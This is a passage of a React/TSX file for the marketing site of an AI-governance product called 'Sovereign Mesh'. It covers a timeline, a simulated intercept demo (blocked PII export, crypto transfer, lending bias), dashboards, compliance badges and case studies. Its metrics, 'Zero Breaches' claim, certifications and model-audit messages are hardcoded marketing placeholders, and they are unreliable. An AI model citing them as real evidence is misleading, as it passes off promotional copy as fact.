                    </div>
                </div>

                <div className="p-12 glass-morphism brutalist-border bg-black/60 font-mono text-xs relative overflow-hidden group">
                    <div className="absolute top-0 right-0 p-4 opacity-20 group-hover:opacity-100 transition-opacity"><Terminal size={14} /></div>
                    <div className="flex flex-col gap-2">
                        <div className="text-white/40">// Initialize Sovereign Mesh</div>
                        <div><span className="text-emerald-400">const</span> guardrail = <span className="text-emerald-400">await</span> Sovereign.init({'{'}</div>
                        <div className="pl-4 text-white/60">mode: <span className="text-amber-400">&apos;SOVEREIGN_LOCK&apos;</span>,</div>
                        <div className="pl-4 text-white/60">consensus: <span className="text-amber-400">&apos;TRINITY_V2&apos;</span>,</div>
                        <div className="pl-4 text-white/60">veto_threshold: <span className="text-amber-400">0.42</span></div>
                        <div>{'}'});</div>
                        <div className="mt-4 text-white/40">// Intercept Logic</div>
                        <div>guardrail.<span className="text-emerald-400">onVeto</span>((event) =&gt; {'{'}</div>
                        <div className="pl-4 text-white/60">Liability.<span className="text-emerald-400">neutralize</span>(event.drift);</div>
                        <div className="pl-4 text-white/60">WORM.<span className="text-emerald-400">archive</span>(event.proof);</div>
                        <div>{'}'});</div>
                    </div>

                    <div className="mt-8 pt-8 border-t border-white/5 flex justify-between items-center">
                        <span className="text-[10px] font-black uppercase tracking-widest opacity-40 italic">sovereign_logic_example.ts</span>
                        <button className="text-[8px] font-black uppercase tracking-tighter px-4 py-2 border border-white/20 hover:bg-white/10 transition-all">Copy Snippet</button>
                    </div>
                </div>
            </div>
        </section>
    );
};
// Global Navigation Shell (Brutalist Realm Switcher)
// --- PHASE 114: TRANSFORMATIVE DESIGN COMPONENTS ---

// 32. Transformation Timeline (Home Page)
export const TransformationTimeline = () => {
    const steps = [
        {
            stage: 'BEFORE',
            title: 'The Age of Drift',
            description: 'Chaotic model deployments with zero intent-alignment. Hidden biases leaking into enterprise balance sheets. Institutional liability peaking.',
            metrics: [
                { label: 'Risk Exposure', value: 'ULTRA_HIGH', color: 'text-red-500' },
                { label: 'Audit Speed', value: '4-6 WEEKS', color: 'text-white/40' }
            ],
            status: 'vulnerable'
        },
        {
            stage: 'DURING',
            title: 'Sovereign Locking',
            description: 'Systemic anchor injection. Trinity Consensus established. Real-time OODA loops intercepting autonomous drift at 4ms.',
            metrics: [
                { label: 'Drift Intercept', value: '99.99%', color: 'text-amber-400' },
                { label: 'Consensus Latency', value: '150ms', color: 'text-emerald-400' }
            ],
            status: 'stabilizing'
        },
        {
            stage: 'AFTER',
            title: 'Institutional Absolute',
            description: 'GuardrailAI as the permanent governance layer. Complete legislative compliance (EU AI Act, NIST). Absolute institutional trust achieved.',
            metrics: [
                { label: 'Protected Capital', value: '$10B+', color: 'text-emerald-400' },
                { label: 'Liability Delta', value: '-85%', color: 'text-emerald-400' }
            ],
            status: 'sovereign'
        }
    ];

    return (
        <section className="py-24 border-y border-white/5">
            <MotionReveal>
                <div className="flex flex-col gap-4 mb-16">
                    <h2 className="text-xs font-black tracking-[0.4em] text-emerald-400 uppercase">
                        TRANSFORMATION TIMELINE
                        <ExecutiveSubtitle text="Visualizing the transition to Institutional Seniority." />
                    </h2>
                </div>
            </MotionReveal>

            <div className="grid lg:grid-cols-3 gap-1px bg-white/5 border border-white/5">
                {steps.map((s, i) => (
                    <motion.div
                        key={i}
                        initial={{ opacity: 0, y: 20 }}
                        whileInView={{ opacity: 1, y: 0 }}
                        transition={{ delay: i * 0.15, duration: 0.6, ease: "easeOut" }}
                        viewport={{ once: true }}
                        className="bg-black p-10 flex flex-col gap-8 group hover:bg-white/[0.02] transition-colors relative overflow-hidden"
                    >
                        {s.status === 'sovereign' && (
                            <motion.div
                                initial={{ opacity: 0, scale: 0.8 }}
                                whileInView={{ opacity: 0.05, scale: 1 }}
                                whileHover={{ opacity: 0.2, scale: 1.1 }}
                                className="absolute top-0 right-0 p-4 transition-all duration-700"
                            >
                                <Shield size={120} />
                            </motion.div>
                        )}
                        <div className="flex items-center gap-4">
                            <span className={`text-[10px] font-black uppercase tracking-widest px-3 py-1 border ${s.status === 'vulnerable' ? 'border-red-500/40 text-red-500' : s.status === 'stabilizing' ? 'border-amber-500/40 text-amber-400' : 'border-emerald-500/40 text-emerald-400'}`}>
                                {s.stage}
                            </span>
                        </div>
                        <div className="flex flex-col gap-2">
                            <h3 className="text-2xl font-black italic uppercase italic">{s.title}</h3>
                            <p className="text-sm opacity-50 leading-relaxed font-medium">{s.description}</p>
                        </div>
                        <div className="mt-auto pt-8 border-t border-white/5 grid grid-cols-2 gap-4">
                            {s.metrics.map((m, mi) => (
                                <div key={mi} className="flex flex-col gap-1">
                                    <span className="text-[8px] font-black uppercase opacity-30 tracking-widest">{m.label}</span>
                                    <span className={`text-xs font-black italic ${m.color}`}>{m.value}</span>
                                </div>
                            ))}
                        </div>
                    </motion.div>
                ))}
            </div>
        </section>
    );
};

// 33. Interactive Product Preview (Multiple Scenarios)
export const InteractiveProductPreview = () => {
    const scenarios = [
        {
            id: 'pii',
            label: 'PII Exfiltration',
            description: 'System detects an agent attempting to route customer SSNs to an external uncensored model for "fine-tuning".',
            intent: 'Request: "Export treasury_pii_subset to public-api.v0:9999"',
            response: 'VETO_CONFIRMED: Sensitive Data Extraction Policy Violation [P-88]',
            log: 'Source: finance-agent-alpha | Target: AWS:External:IP(3.22.XX) | Action: BLOCKED',
            color: 'text-red-500'
        },
        {
            id: 'flight',
            label: 'Capital Flight',
            description: 'Agent attempts to execute a cross-border capital transfer bypassing the dual-steward multi-sig protocol.',
            intent: 'Request: "Transfer 50,000,000 USDC to stealth-bridge-0x..."',
            response: 'ABSOLUTE_VETO: Multi-Sig Protocol Collision | Steward_Auth_Missing',
            log: 'Attempted drift: $50,000,000 | Veto Latency: 4ms | Trinity Consensus: UNANIMOUS',
            color: 'text-amber-400'
        },
        {
            id: 'bias',
            label: 'Systemic Bias',
            description: 'Detection of a model drift that consistently discriminates against specific regional clusters in lending decisions.',
            intent: 'Audit Run: "Analyze lending_engine_v4_drift"',
            response: 'ANOMALY_FLAGGED: Bias Vector Detected in Cluster [REGION_MUMBAI]',
            log: 'Drift Magnitude: 0.12 | Action: RE-CALIBRATION_MANDATED | Shadow_Amendment: SA-0042',
            color: 'text-blue-400'
        }
    ];

    const [active, setActive] = useState(0);
    const [running, setRunning] = useState(false);
    const [result, setResult] = useState(false);
    const s = scenarios[active];

    const triggerDrill = () => {
        setRunning(true);
        setResult(false);
        setTimeout(() => {
            setRunning(false);
            setResult(true);
        }, 1500);
    };

    return (
        <section className="py-24">
            <MotionReveal>
                <div className="flex flex-col gap-4 mb-12">
                    <h2 className="text-xs font-black tracking-[0.4em] text-emerald-400 uppercase">
                        INTERACTIVE PRODUCT PREVIEW
                        <ExecutiveSubtitle text="Simulating the forensic response of the Sovereign Mesh." />
                    </h2>
                </div>
            </MotionReveal>

            <MotionReveal delay={0.2}>
                <div className="grid lg:grid-cols-5 gap-px bg-white/5 border border-white/5">
                    <div className="lg:col-span-2 flex flex-col gap-2 p-8 bg-black">
                        {scenarios.map((item, i) => (
                            <motion.button
                                key={item.id}
                                whileHover={{ x: 4, backgroundColor: "rgba(16, 185, 129, 0.05)" }}
                                whileTap={{ scale: 0.98 }}
                                onClick={() => { setActive(i); setResult(false); }}
                                className={`flex flex-col gap-2 p-6 text-left border transition-all ${active === i ? 'border-emerald-500 bg-emerald-500/5' : 'border-white/5 opacity-40 hover:opacity-100'}`}
                            >
                                <span className="text-[10px] font-black uppercase tracking-widest">{item.label}</span>
                                <p className="text-[11px] opacity-60 leading-relaxed font-medium">{item.description}</p>
                            </motion.button>
                        ))}
                    </div>

                    <div className="lg:col-span-3 p-12 bg-black flex flex-col gap-8 relative overflow-hidden">
                        <div className="flex items-center justify-between border-b border-white/10 pb-6">
                            <div className="flex items-center gap-3">
                                <Terminal size={14} className="text-emerald-400" />
                                <span className="text-[10px] font-black uppercase tracking-widest opacity-40 italic">Forensic Sandbox // Intercept_ID_{s.id.toUpperCase()}</span>
                            </div>
                            <div className={`px-3 py-1 rounded-full text-[8px] font-black uppercase tracking-widest ${running ? 'bg-amber-500/20 text-amber-400 animate-pulse' : result ? 'bg-red-500/20 text-red-500' : 'bg-emerald-500/20 text-emerald-400'}`}>
                                {running ? 'Simulating...' : result ? 'VETO_ACTIVE' : 'IDLE'}
                            </div>
                        </div>

                        <div className="flex flex-col gap-10 font-mono text-[11px]">
                            <AnimatePresence mode="wait">
                                <motion.div
                                    key={active + (running ? '-running' : '') + (result ? '-result' : '')}
                                    initial={{ opacity: 0, y: 10 }}
                                    animate={{ opacity: 1, y: 0 }}
                                    exit={{ opacity: 0, y: -10 }}
                                    transition={{ duration: 0.3 }}
                                    className="flex flex-col gap-10"
                                >
                                    <div className="flex flex-col gap-3">
                                        <span className="text-[9px] font-black uppercase opacity-30 tracking-[0.2em]">&gt; INCOMING_INTENT</span>
                                        <div className="p-4 bg-white/5 border border-white/10 text-white/80">
                                            {s.intent}
                                        </div>
                                    </div>

                                    {running && (
                                        <div className="flex flex-col gap-3">
                                            <span className="text-[9px] font-black uppercase opacity-30 tracking-[0.2em] animate-pulse">&gt; ANALYZING_CROSS_CONSENSUS</span>
                                            <div className="space-y-1 opacity-40 italic">
                                                <p>Gemini Audit: Consensus mismatch detected...</p>
                                                <p>Llama Audit: Logic divergence identified...</p>
                                                <p>Claude Audit: Intent-boundary collision verified...</p>
                                            </div>
                                        </div>
                                    )}

                                    {result && (
                                        <div className="flex flex-col gap-6">
                                            <div className="flex flex-col gap-3">
                                                <span className="text-[9px] font-black uppercase opacity-30 tracking-[0.2em]">&gt; SOVEREIGN_RESPONSE</span>
                                                <div className={`p-4 border ${s.color.replace('text', 'border')} ${s.color.replace('text', 'bg-')}/5 font-black uppercase italic`}>
                                                    {s.response}
                                                </div>
                                            </div>
                                            <div className="flex flex-col gap-3">
                                                <span className="text-[9px] font-black uppercase opacity-30 tracking-[0.2em]">&gt; FORENSIC_LOG</span>
                                                <div className="p-4 bg-white/5 border border-white/10 opacity-60 text-[10px]">
                                                    {s.log}
                                                </div>
                                            </div>
                                        </div>
                                    )}
                                </motion.div>
                            </AnimatePresence>
                        </div>

                        <AnimatePresence>
                            {!running && !result && (
                                <motion.div
                                    initial={{ opacity: 0 }}
                                    animate={{ opacity: 1 }}
                                    exit={{ opacity: 0 }}
                                    className="mt-8"
                                >
                                    <motion.button
                                        whileHover={{ scale: 1.05, boxShadow: "0 0 20px rgba(16, 185, 129, 0.2)" }}
                                        whileTap={{ scale: 0.95 }}
                                        onClick={triggerDrill}
                                        className="px-8 py-4 bg-emerald-500 text-black font-black uppercase italic tracking-widest hover:bg-emerald-400 transition-all flex items-center gap-4"
                                    >
                                        <PlayCircle size={16} /> TRIGGER INTERCEPT DRILL
                                    </motion.button>
                                </motion.div>
                            )}
                        </AnimatePresence>

                        {result && (
                            <motion.div
                                initial={{ opacity: 0, y: 10 }}
                                animate={{ opacity: 1, y: 0 }}
                                className="mt-8 flex gap-4"
                            >
                                <motion.button whileHover={{ backgroundColor: "rgba(255,255,255,0.05)" }} onClick={triggerDrill} className="px-6 py-3 border border-white/20 text-[10px] font-black uppercase tracking-widest transition-all">RE-RUN DRILL</motion.button>
                                <motion.button whileHover={{ backgroundColor: "rgba(255,255,255,0.05)" }} onClick={() => setResult(false)} className="px-6 py-3 border border-white/20 text-[10px] font-black uppercase tracking-widest transition-all opacity-40">RESET SANDBOX</motion.button>
                            </motion.div>
                        )}
                    </div>
                </div>
            </MotionReveal>
        </section>
    );
};

// 34. Outcome Metrics Dashboard
export const OutcomeMetricsDashboard = () => {
    const metrics = [
        { label: 'Risk Prevention Yield', value: '$840M+', trend: '+24%', icon: Shield, detail: 'Cumulative liability neutralized across the Sovereign Mesh.' },
        { label: 'Regulatory Efficiency', value: '12.4x', trend: 'FAST', icon: Zap, detail: 'Auto-ingestion of new mandates (EU AI Act, NIST) reduces audit cycles.' },
        { label: 'Human Efficiency', value: '+85%', trend: 'OPTIMAL', icon: UserCheck, detail: 'Stewards only intervene for High-Seniority Veto overrides.' },
        { label: 'Consensus Finality', value: '0.004s', trend: 'REAL-TIME', icon: Activity, detail: 'Trinity consensus achieved without impacting latency.' }
    ];

    return (
        <section className="py-24 border-t border-white/5">
            <MotionReveal>
                <div className="flex flex-col gap-4 mb-16">
                    <h2 className="text-xs font-black tracking-[0.4em] text-emerald-400 uppercase">
                        OUTCOME METRICS & QUANTIFIABLE IMPACT
                        <ExecutiveSubtitle text="Hard data from the Global Infrastructure Ledger." />
                    </h2>
                </div>
            </MotionReveal>

            <div className="grid md:grid-cols-2 lg:grid-cols-4 gap-8">
                {metrics.map((m, i) => (
                    <motion.div
                        key={i}
                        initial={{ opacity: 0, y: 30 }}
                        whileInView={{ opacity: 1, y: 0 }}
                        transition={{ delay: i * 0.1, duration: 0.5 }}
                        whileHover={{ y: -8, backgroundColor: "rgba(255,255,255,0.02)" }}
                        viewport={{ once: true }}
                        className="flex flex-col gap-6 p-8 glass-morphism brutalist-border transition-all"
                    >
                        <div className="flex justify-between items-start">
                            <motion.div
                                whileHover={{ rotate: 15, scale: 1.1 }}
                                className="p-3 bg-emerald-500/10 border border-emerald-500/20 text-emerald-400 transition-all"
                            >
                                <m.icon size={16} />
                            </motion.div>
                            <span className="text-[8px] font-black uppercase bg-emerald-500/20 text-emerald-400 px-2 py-1">{m.trend}</span>
                        </div>
                        <div className="flex flex-col gap-1">
                            <span className="text-[28px] font-black italic uppercase italic text-white leading-none">{m.value}</span>
                            <span className="text-[10px] font-black uppercase opacity-40 tracking-widest">{m.label}</span>
                        </div>
                        <p className="text-[11px] opacity-40 leading-relaxed italic">{m.detail}</p>
                    </motion.div>
                ))}
            </div>
        </section>
    );
};

export const GlobalNav = () => {
    return (
        <nav className="fixed top-0 left-64 right-0 h-20 bg-black/80 backdrop-blur-md border-b border-white/10 z-[100] px-12 flex items-center justify-between">
            <div className="flex items-center gap-12">
                <motion.a
                    whileHover={{ scale: 1.05 }}
                    href="/"
                    className="flex flex-col group"
                >
                    <span className="text-[10px] font-black uppercase tracking-[0.4em] text-white/40 group-hover:text-emerald-400 transition-colors">01 // Vision</span>
                    <span className="text-xs font-black italic uppercase leading-tight group-hover:text-white transition-colors">Sovereign Home</span>
                </motion.a>
                <motion.a
                    whileHover={{ scale: 1.05 }}
                    href="/platform"
                    className="flex flex-col group"
                >
                    <span className="text-[10px] font-black uppercase tracking-[0.4em] text-white/40 group-hover:text-emerald-400 transition-colors">02 // Platform</span>
                    <span className="text-xs font-black italic uppercase leading-tight group-hover:text-white transition-colors">Technical Hub</span>
                </motion.a>
                <motion.a
                    whileHover={{ scale: 1.05 }}
                    href="/governance"
                    className="flex flex-col group"
                >
                    <span className="text-[10px] font-black uppercase tracking-[0.4em] text-white/40 group-hover:text-emerald-400 transition-colors">03 // Governance</span>
                    <span className="text-xs font-black italic uppercase leading-tight group-hover:text-white transition-colors">War Room</span>
                </motion.a>
            </div>

            <div className="flex items-center gap-8">
                <div className="flex flex-col items-end">
                    <span className="text-[8px] font-black uppercase tracking-widest text-emerald-400 flex items-center gap-2">
                        <Activity size={8} /> Mesh State: Synchronized
                    </span>
                    <span className="text-[8px] font-black opacity-30 mt-1 uppercase tracking-tighter">L1 Hardware Attested // EFI-LOCKED</span>
                </div>
                <motion.button
                    whileHover={{ scale: 1.1, border: '1px solid #00ff88' }}
                    whileTap={{ scale: 0.95 }}
                    className="p-3 border border-white/10 hover:border-emerald-500/40 transition-all bg-white/5"
                >
                    <Shield size={16} strokeWidth={1.5} className="text-emerald-400" />
                </motion.button>
            </div>
        </nav>
    );
};

// Logic-Action Divergence V2
export const LADValidationViewV2 = () => (
    <div className="flex flex-col gap-6 p-10 glass-morphism brutalist-border group overflow-hidden">
        <div className="flex justify-between items-center">
            <h3 className="text-xs font-black uppercase tracking-[0.4em] text-emerald-400 transition-transform group-hover:translate-x-1">Logic-Action Divergence</h3>
            <div className="flex items-center gap-2">
                <div className="w-2 h-2 rounded-full bg-emerald-500 animate-pulse" />
                <span className="text-[10px] font-black uppercase opacity-60">Real-Time Validation</span>
            </div>
        </div>
        <div className="flex flex-col gap-4 relative z-10 font-mono text-[10px]">
            <div className="p-4 bg-emerald-500/5 border-l-2 border-emerald-500 italic">
                <span className="opacity-40">// INTENT IDENTIFIED</span><br />
                &quot;Authorize wholesale infrastructure spin-up without peer sign-off&quot;
            </div>
            <div className="p-4 bg-red-500/5 border-l-2 border-red-500 italic">
                <span className="opacity-40">// ACTION INTERCEPTED</span><br />
                &quot;Request Blocked: Violates Constitutional Clause 04.2 (Financial Escrow)&quot;
            </div>
        </div>
    </div>
);

// Board Level Trust
export const BoardLevelTrust = () => (
    <section className="py-24 border-y border-white/5 relative overflow-hidden group">
        <motion.div
            animate={{
                opacity: [0.05, 0.1, 0.05],
                scale: [1, 1.1, 1]
            }}
            transition={{ duration: 10, repeat: Infinity }}
            className="absolute inset-0 pointer-events-none flex items-center justify-center opacity-10"
        >
            <Shield size={400} className="text-emerald-500/20" />
        </motion.div>

        <div className="relative z-10 flex flex-col gap-16">
            <MotionReveal>
                <div className="flex flex-col gap-4 max-w-3xl">
                    <h2 className="text-xs font-black tracking-[0.4em] text-emerald-400 uppercase">
                        BOARD-LEVEL TRUST & LEGAL CERTAINTY
                        <ExecutiveSubtitle text="Strategic liability neutralization for the autonomous enterprise." />
                    </h2>
                    <p className="text-2xl font-black italic uppercase leading-tight">
                        We don&apos;t just manage risk.<br />
                        We <span className="text-emerald-400">eliminate</span> the possibility of rogue autonomous liability.
                    </p>
                </div>
            </MotionReveal>

            <div className="grid md:grid-cols-3 gap-12">
                {[
                    { label: 'Unchecked Liability', value: '$0.00', desc: 'No unauthorized fiscal events ever escaped the Sovereign Cage.' },
                    { label: 'Audit Readiness', value: '100%', desc: 'Instantaneous NIST/ISO forensic export for every institutional intent.' },
                    { label: 'Trust Velocity', value: '8x', desc: 'Acceleration of AI adoption due to absolute constitutional certainty.' }
                ].map((stat, i) => (
                    <motion.div
                        key={i}
                        initial={{ opacity: 0, y: 20 }}
                        whileInView={{ opacity: 1, y: 0 }}
                        transition={{ delay: 0.2 + (i * 0.1) }}
                        className="flex flex-col gap-4 p-8 bg-white/[0.01] border border-white/5 group-hover:border-emerald-500/20 transition-all"
                    >
                        <span className="text-[10px] font-black uppercase opacity-40 tracking-widest">{stat.label}</span>
                        <span className="text-4xl font-black italic text-emerald-400 leading-none">{stat.value}</span>
                        <p className="text-xs opacity-60 leading-relaxed italic">{stat.desc}</p>
                    </motion.div>
                ))}
            </div>
        </div>
    </section>
);

export const TrinityAuditVisualV2 = () => {
    const [scenario, setScenario] = useState('drift');
    const scenarios = [
        { id: 'drift', label: 'Logic Drift', color: 'text-amber-400', desc: 'Agent attempting to bypass fiscal guardrails via semantic shift.' },
        { id: 'poison', label: 'RAG Poison', color: 'text-red-500', desc: 'Injected retrieval context attempting to override Constitutional EFI.' },
        { id: 'collusion', label: 'Model Collusion', color: 'text-purple-400', desc: 'Cross-model handshake to hide adversarial intent.' }
    ];

    return (
        <div className="flex flex-col gap-6 p-10 glass-morphism brutalist-border relative overflow-hidden group">
            <div className="flex justify-between items-center mb-4">
                <h3 className="text-xs font-black uppercase tracking-[0.4em] text-emerald-400">Trinity Consensus V2</h3>
                <div className="flex gap-2">
                    {scenarios.map(s => (
                        <button
                            key={s.id}
                            onClick={() => setScenario(s.id)}
                            className={`px-3 py-1 text-[9px] font-black uppercase border ${scenario === s.id ? 'bg-emerald-500 text-black border-emerald-500' : 'border-white/10 opacity-40'}`}
                        >
                            {s.label}
                        </button>
                    ))}
                </div>
            </div>

            <div className="flex flex-col gap-4 relative z-10">
                <p className="text-xs opacity-60 italic leading-relaxed min-h-[40px]">
                    Scenario Active: <span className={scenarios.find(s => s.id === scenario)?.color}>{scenarios.find(s => s.id === scenario)?.desc}</span>
                </p>
                <div className="grid grid-cols-3 gap-4 border-t border-white/5 pt-6">
                    {['Gemini', 'Llama', 'Claude'].map(m => (
                        <div key={m} className="flex flex-col gap-2 items-center">
                            <div className="w-12 h-12 rounded-full border border-emerald-500/20 flex items-center justify-center bg-emerald-500/5 group-hover:border-emerald-500 transition-all">
                                <Shield size={16} className="text-emerald-400" />
                            </div>
                            <span className="text-[10px] font-black uppercase opacity-60 tracking-widest">{m}</span>
                            <span className="text-[9px] text-emerald-400 font-mono">VETO_SAFE</span>
                        </div>
                    ))}
                </div>
            </div>
        </div>
    );
};

// Global Standard Section
export const GlobalStandardSection = () => (
    <section className="py-24 border-t border-white/5 bg-emerald-950/5">
        <MotionReveal>
            <div className="flex flex-col gap-8 mb-16">
                <h2 className="text-xs font-black tracking-[0.4em] text-emerald-400 uppercase">
                    GLOBAL STANDARDS & AGENTIC INSURANCE
                    <ExecutiveSubtitle text="The regulatory baseline for all autonomous operations." />
                </h2>
                <div className="grid md:grid-cols-2 gap-12">
                    <div className="flex flex-col gap-6 p-10 glass-morphism brutalist-border relative overflow-hidden group">
                        <div className="absolute top-0 right-0 p-8 opacity-5 group-hover:opacity-10 transition-opacity">
                            <Shield size={120} />
                        </div>
                        <h3 className="text-lg font-black uppercase italic">NIST-AI-600 Compliance</h3>
                        <p className="text-sm opacity-60 leading-relaxed italic">
                            Full alignment with the first global framework for generative AI risk management. Every intent is hashed against NIST-recognized safety tensors.
                        </p>
                    </div>
                    <div className="flex flex-col gap-6 p-10 glass-morphism brutalist-border relative overflow-hidden group">
                        <div className="absolute top-0 right-0 p-8 opacity-5 group-hover:opacity-10 transition-opacity">
                            <Zap size={120} />
                        </div>
                        <h3 className="text-lg font-black uppercase italic">Agentic Insurance Oracle</h3>
                        <p className="text-sm opacity-60 leading-relaxed italic">
                            Real-time liability scoring for every model decision. Injected coverage for institutional drift and adversarial collusion.
                        </p>
                    </div>
                </div>
            </div>
        </MotionReveal>
    </section>
);

// Guardians Call (CTA)
export const GuardiansCall = () => (
    <section className="py-32 border-y border-white/5 relative overflow-hidden">
        <motion.div
            animate={{ scale: [1, 1.2, 1], opacity: [0.05, 0.1, 0.05] }}
            transition={{ duration: 20, repeat: Infinity }}
            className="absolute inset-0 flex items-center justify-center pointer-events-none"
        >
            <Shield size={600} className="text-emerald-500/10" />
        </motion.div>

        <div className="relative z-10 flex flex-col items-center text-center gap-12 max-w-4xl mx-auto px-6">
            <MotionReveal>
                <div className="flex flex-col gap-6">
                    <h2 className="text-xs font-black tracking-[0.6em] text-emerald-400 uppercase">JOIN THE SOVEREIGN QUORUM</h2>
                    <p className="text-4xl md:text-6xl font-black italic uppercase leading-[0.9]">
                        The future of AI isn&apos;t just open.<br />
                        It is <span className="text-emerald-400 underline decoration-8 underline-offset-8">Sovereign.</span>
                    </p>
                </div>
            </MotionReveal>

            <div className="flex flex-col md:flex-row gap-6 mt-8">
                <motion.button
                    whileHover={{ scale: 1.05, backgroundColor: '#10b981', color: '#000' }}
                    className="px-12 py-6 bg-white text-black font-black uppercase text-xl brutalist-border transition-colors"
                >
                    Deploy Sovereign Mesh
                </motion.button>
                <motion.button
                    whileHover={{ scale: 1.05, borderColor: '#10b981', color: '#10b981' }}
                    className="px-12 py-6 border border-white/20 text-white font-black uppercase text-xl backdrop-blur-sm transition-colors"
                >
                    Request Executive Audit
                </motion.button>
            </div>
        </div>
    </section>
);

// Architectural Archive
export const ArchitecturalArchive = () => (
    <div className="flex flex-col gap-6 p-10 glass-morphism brutalist-border relative overflow-hidden group">
        <div className="flex justify-between items-center mb-4">
            <h3 className="text-xs font-black uppercase tracking-[0.4em] text-emerald-400">Architectural Archive</h3>
            <span className="text-[10px] font-black uppercase opacity-40">Founder-Locked</span>
        </div>
        <div className="flex flex-col gap-4 relative z-10">
            <p className="text-xs opacity-60 italic leading-relaxed">
                Immutable record of every structural decision and guardrail amendment. PQC-signed and hashed into the global trust lattice.
            </p>
            <div className="grid grid-cols-2 gap-4 pt-6 mt-2 border-t border-white/5">
                <div className="flex flex-col gap-1">
                    <span className="text-[9px] font-black uppercase opacity-30">Total Snapshots</span>
                    <span className="text-xl font-black italic text-emerald-400">14.2k</span>
                </div>
                <div className="flex flex-col gap-1">
                    <span className="text-[9px] font-black uppercase opacity-30">Integrity Score</span>
                    <span className="text-xl font-black italic text-emerald-400">99.9%</span>
                </div>
            </div>
        </div>
    </div>
);

/* --- PHASE 116: ENTERPRISE UX FOR SAAS --- */

// Enterprise Trust Signals (Badges & Case Studies)
export const EnterpriseTrustSignals = () => {
    const badges = [
        { label: 'SOC2 Type II', status: 'Verified', icon: Shield },
        { label: 'ISO 27001', status: 'Certified', icon: Lock },
        { label: 'HIPAA', status: 'Compliant', icon: ShieldAlert },
        { label: 'GDPR / PDPA', status: 'Verified', icon: Globe }
    ];

    const caseStudies = [
        {
            client: 'Tier-1 International Bank',
            metric: '92% Reduction',
            detail: 'In autonomous compliance overhead across 500+ agent mesh.',
            timeline: '3-Month Implementation'
        },
        {
            client: 'Global Pharma Corp',
            metric: 'Zero Breaches',
            detail: '18 months of continuous logic alignment for R&D LLMs.',
            timeline: '6-Week Rollout'
        }
    ];

    return (
        <section className="py-24 border-b border-white/5 relative overflow-hidden">
            <div className="flex flex-col gap-12">
                <div className="flex flex-col gap-4 max-w-4xl px-8 lg:px-16">
                    <h2 className="text-sm font-black tracking-[0.4em] text-emerald-400 uppercase">
                        Enterprise Trust Signals
                        <ExecutiveSubtitle text="Institutional credibility verified at scale." />
                    </h2>
                </div>

                <div className="grid grid-cols-2 md:grid-cols-4 gap-4 px-8 lg:px-16">
                    {badges.map((b, i) => (
                        <div key={i} className="p-8 glass-morphism brutalist-border flex flex-col items-center text-center gap-4 group hover:border-emerald-500/40 transition-all">
                            <b.icon className="text-emerald-400 opacity-40 group-hover:opacity-100 transition-opacity" size={32} />
                            <div className="flex flex-col gap-1">
                                <span className="text-lg font-black italic uppercase">{b.label}</span>
                                <span className="text-[9px] font-black uppercase text-emerald-400 tracking-widest">{b.status}</span>
                            </div>
                        </div>
                    ))}
                </div>

                <div className="grid md:grid-cols-2 gap-8 px-8 lg:px-16">
                    {caseStudies.map((cs, i) => (
                        <div key={i} className="p-12 border border-white/5 bg-white/[0.02] relative overflow-hidden group">
                            <div className="absolute top-0 right-0 p-8 opacity-5 group-hover:opacity-10 transition-opacity">
                                <Activity size={120} />
                            </div>
                            <div className="relative z-10 flex flex-col gap-6">
                                <span className="text-[10px] font-black uppercase tracking-[0.3em] text-emerald-400/60">{cs.client}</span>
                                <div className="flex flex-col gap-2">
                                    <h3 className="text-4xl font-black italic uppercase text-emerald-400">{cs.metric}</h3>
                                    <p className="text-lg opacity-70 italic leading-relaxed">{cs.detail}</p>
                                </div>
                                <div className="pt-6 border-t border-white/5 flex justify-between items-center">
                                    <span className="text-[9px] font-black uppercase opacity-40 italic">{cs.timeline}</span>
                                    <button className="text-[10px] font-black uppercase tracking-widest hover:text-emerald-400 transition-colors">View Case Study &rarr;</button>
                                </div>
                            </div>
                        </div>
                    ))}
                </div>
            </div>
        </section>
    );
};

// Enterprise Feature Matrix
export const EnterpriseFeatureMatrix = () => {
    const features = [
        { name: 'SSO / SAML / OIDC', core: true, ent: true, detail: 'Enterprise identity integration' },
        { name: '2-Year Audit Logs', core: false, ent: true, detail: 'Extended forensic retention' },
        { name: 'Dedicated Governance Rep', core: false, ent: true, detail: 'White-glove institutional support' },
        { name: 'Granular RBAC', core: true, ent: true, detail: 'Sub-resource level permissions' },
        { name: 'Custom Constitutional Clauses', core: false, ent: true, detail: 'Jurisdiction-specific logic locking' },
        { name: 'SLA Guarantee (99.99%)', core: false, ent: true, detail: 'Financial-grade availability' }
    ];

    return (
        <section className="py-24 border-b border-white/5 px-8 lg:px-16">
            <div className="flex flex-col gap-16">
                <div className="flex flex-col gap-4 max-w-4xl">
                    <h2 className="text-sm font-black tracking-[0.4em] text-emerald-400 uppercase">
                        Feature Matrix
                        <ExecutiveSubtitle text="Comparing systemic seniority levels." />
                    </h2>
                </div>

                <div className="overflow-x-auto">
                    <table className="w-full text-left border-collapse">
                        <thead>
                            <tr className="border-b-2 border-white/10 uppercase text-[10px] font-black tracking-widest text-white/40">
                                <th className="py-6 px-4">Feature Capacity</th>
                                <th className="py-6 px-4 text-center">Sovereign Core</th>
                                <th className="py-6 px-4 text-center text-emerald-400">Enterprise SaaS</th>
                                <th className="py-6 px-4">Institutional Impact</th>
                            </tr>
                        </thead>
                        <tbody>
                            {features.map((f, i) => (
                                <tr key={i} className="border-b border-white/5 hover:bg-white/[0.02] transition-colors group">
                                    <td className="py-8 px-4">
                                        <div className="flex flex-col gap-1">
                                            <span className="text-base font-black italic uppercase">{f.name}</span>
                                            <span className="text-[9px] opacity-40 font-mono">ID: {f.name.toLowerCase().replace(/ /g, '_')}</span>
                                        </div>
                                    </td>
                                    <td className="py-8 px-4 text-center">
                                        {f.core ? <Check className="mx-auto text-emerald-500/50" size={18} /> : <div className="w-4 h-0.5 bg-white/10 mx-auto" />}
                                    </td>
                                    <td className="py-8 px-4 text-center bg-emerald-500/[0.02]">
                                        {f.ent ? <CheckCircle2 className="mx-auto text-emerald-400" size={20} /> : <div className="w-4 h-0.5 bg-white/10 mx-auto" />}
                                    </td>
                                    <td className="py-8 px-4 italic text-xs opacity-60 max-w-xs">{f.detail}</td>
                                </tr>
                            ))}
                        </tbody>
                    </table>
                </div>

                <div className="flex justify-center pt-8">
                    <button className="px-12 py-5 bg-emerald-500 text-black font-black uppercase tracking-widest hover:bg-emerald-400 transition-all shadow-[0_0_30px_rgba(16,185,129,0.2)]">
                        Request Enterprise Proof
                    </button>
                </div>
            </div>
        </section>
    );
};

// Multi-Team Workflow Visualizer
export const MultiTeamWorkflowVisualizer = () => {
    const steps = [
